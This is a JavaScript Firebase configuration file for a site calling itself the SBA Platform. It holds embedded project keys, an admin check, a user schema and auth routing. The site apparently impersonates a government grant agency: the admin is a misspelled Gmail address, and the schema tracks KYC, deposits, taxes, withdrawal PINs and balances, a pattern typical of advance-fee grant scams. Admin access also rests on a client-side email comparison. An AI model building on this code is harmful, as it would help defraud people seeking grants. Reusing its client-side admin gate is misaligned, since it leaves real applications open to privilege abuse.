// ============================================================
// firebase-config.js — SBA Platform Core Configuration
// Project: small-business-administration
// ============================================================

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import {
  getAuth,
  browserLocalPersistence,
  setPersistence,
  onAuthStateChanged,
  signOut,
  sendEmailVerification
} from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
import {
  getFirestore,
  doc,
  getDoc,
  setDoc,
  updateDoc,
  serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
import { getStorage } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-storage.js";

// ============================================================
// FIREBASE PROJECT CONFIGURATION
// ============================================================
const firebaseConfig = {
  apiKey: "AIzaSyD9sEdygrjz-m1Ou3m9O3L5mXyPEs9LAJM",
  authDomain: "small-business-administration.firebaseapp.com",
  projectId: "small-business-administration",
  storageBucket: "small-business-administration.firebasestorage.app",
  messagingSenderId: "825499942780",
  appId: "1:825499942780:web:4f7e5ceb9d6125e9e5aef9"
};

// ── Initialize Firebase ──
const app = initializeApp(firebaseConfig);
export const auth = getAuth(app);
export const db   = getFirestore(app);
export const storage = getStorage(app);

// ── Session Persistence ──
(async () => {
  try {
    await setPersistence(auth, browserLocalPersistence);
  } catch (err) {
    console.error("[SBA] Auth persistence error:", err);
  }
})();

// ============================================================
// CLOUDINARY
// ============================================================
export const CLOUDINARY_CONFIG = {
  CLOUD_NAME:   "dcnv6v9g0",
  UPLOAD_PRESET: "sba_uploads",
  UPLOAD_API_URL: "https://api.cloudinary.com/v1_1/dcnv6v9g0/image/upload"
};

export const uploadToCloudinary = async (file) => {
  if (!file) return null;
  const formData = new FormData();
  formData.append("file", file);
  formData.append("upload_preset", CLOUDINARY_CONFIG.UPLOAD_PRESET);
  try {
    const res = await fetch(CLOUDINARY_CONFIG.UPLOAD_API_URL, { method: "POST", body: formData });
    if (!res.ok) throw new Error("Cloudinary upload failed.");
    const data = await res.json();
    return data.secure_url || null;
  } catch (err) {
    console.error("[SBA] Cloudinary error:", err);
    throw err;
  }
};

// ============================================================
// ADMIN CONFIGURATION
// ============================================================
export const ADMIN_EMAIL = "sba.suppor@gmail.com";
export const isAdmin = (email) => {
  if (!email) return false;
  return email.toLowerCase().trim() === ADMIN_EMAIL.toLowerCase().trim();
};

// ============================================================
// DATABASE COLLECTIONS
// ============================================================
export const DB_COLLECTIONS = {
  USERS:         "users",
  TRANSACTIONS:  "transactions",
  APPLICATIONS:  "applications",
  KYC:           "kyc",
  NOTIFICATIONS: "notifications",
  LOGS:          "logs"
};

// ============================================================
// USER SCHEMA BUILDER
// ============================================================
export const buildNewUserPayload = (rawData) => {
  const email = (rawData.email || "").toLowerCase().trim();
  return {
    // Flat fields (used across all pages for easy access)
    uid:        rawData.uid  || "",
    fullName:   ((rawData.firstName || "") + " " + (rawData.lastName || "")).trim(),
    firstName:  (rawData.firstName  || "").trim(),
    lastName:   (rawData.lastName   || "").trim(),
    email,
    username:   (rawData.username   || "").trim().toLowerCase(),
    phoneNumber:(rawData.phoneNumber|| "").trim(),
    country:    rawData.country     || "",
    gender:     rawData.gender      || "",
    dob:        rawData.dob         || "",
    allocatedProgram: rawData.allocatedProgram || "SBA Grant Program",

    // Status flags
    kycStatus:      "IDLE",   // IDLE | UNDER_REVIEW | SUCCESSFUL | FAILED
    applyStatus:    "IDLE",   // IDLE | PENDING | SUCCESSFUL | FAILED
    depositStatus:  "IDLE",
    withdrawStatus: "IDLE",
    taxStatus:      "IDLE",
    awardStatus:    "IDLE",

    // Financials
    balance:         0,
    requestedAmount: 0,
    totalAward:      0,

    // Chat & Ledger
    chatHistory: [],
    ledger:      [],
    history:     [],

    // Security
    securityPin:  "",
    withdrawPin:  "",
    transactionPin: "",

    // Nested status (for firebase-config monitorAuthState)
    status: {
      accountStatus: "active",
      emailVerified: false,
      kycStatus:     "unsubmitted",
      isOnline:      true,
      lastSeen:      serverTimestamp()
    },

    // Metadata
    metadata: {
      createdAt:        serverTimestamp(),
      updatedAt:        serverTimestamp(),
      registrationStep: Number(rawData.registrationStep) || 1,
      emailVerifiedAt:  null
    }
  };
};

// ============================================================
// FETCH USER DATA
// ============================================================
export const getUserData = async (uid) => {
  if (!uid) return null;
  try {
    const snap = await getDoc(doc(db, DB_COLLECTIONS.USERS, uid));
    return snap.exists() ? snap.data() : null;
  } catch (err) {
    console.error("[SBA] getUserData error:", err);
    return null;
  }
};

// ============================================================
// AUTH STATE MONITOR & ROUTER
// ============================================================
export const monitorAuthState = (callback) => {
  return onAuthStateChanged(auth, async (user) => {
    const path     = window.location.pathname;
    const pageName = (path.split("/").pop() || "index.html").toLowerCase();

    const PUBLIC_PAGES  = ["", "index.html", "login.html", "register1.html", "register2.html", "forgot-password.html", "terms.html"];
    const isPublicPage  = PUBLIC_PAGES.includes(pageName);
    const isVerifyPage  = pageName === "verify.html";
    const isWelcomePage = pageName === "welcome.html";
    const isAdminPage   = pageName === "admin-portal.html";

    if (!user) {
      if (!isPublicPage) {
        window.location.href = "login.html";
        return;
      }
    } else {
      const admin = isAdmin(user.email);

      // Sync verified flag to Firestore (non-blocking)
      if (user.emailVerified && !admin) {
        try {
          await updateDoc(doc(db, DB_COLLECTIONS.USERS, user.uid), {
            "status.emailVerified": true,
            "status.isOnline":      true,
            "status.lastSeen":      serverTimestamp()
          });
        } catch (_) { /* non-critical */ }
      }

      if (admin) {
        if (!isAdminPage) { window.location.href = "admin-portal.html"; return; }
      } else {
        if (!user.emailVerified) {
          // Google users are auto-verified
          const isGoogle = user.providerData.some(p => p.providerId === "google.com");
          if (!isGoogle && !isVerifyPage) {
            window.location.href = "verify.html"; return;
          }
        } else {
          if (isPublicPage || isVerifyPage) {
            window.location.href = "dashboard.html"; return;
          }
        }
      }
    }

    if (callback) callback(user);
  });
};

// ============================================================
// MULTI-STEP REGISTRATION SESSION
// ============================================================
const SESSION_KEY = "SBA_REG_DATA";

export const saveRegistrationStep = (data) => {
  try {
    const existing = JSON.parse(sessionStorage.getItem(SESSION_KEY) || "{}");
    sessionStorage.setItem(SESSION_KEY, JSON.stringify({ ...existing, ...data }));
  } catch (e) {
    console.error("[SBA] Session write error:", e);
  }
};

export const getRegistrationData = () => {
  try {
    return JSON.parse(sessionStorage.getItem(SESSION_KEY) || "{}");
  } catch (e) {
    console.error("[SBA] Session read error:", e);
    return {};
  }
};

export const clearRegistrationData = () => {
  try { sessionStorage.removeItem(SESSION_KEY); } catch (_) {}
};

export const clearSession = async () => {
  try {
    clearRegistrationData();
    await signOut(auth);
    window.location.href = "login.html";
  } catch (err) {
    console.error("[SBA] Logout error:", err);
    window.location.href = "login.html";
  }
};
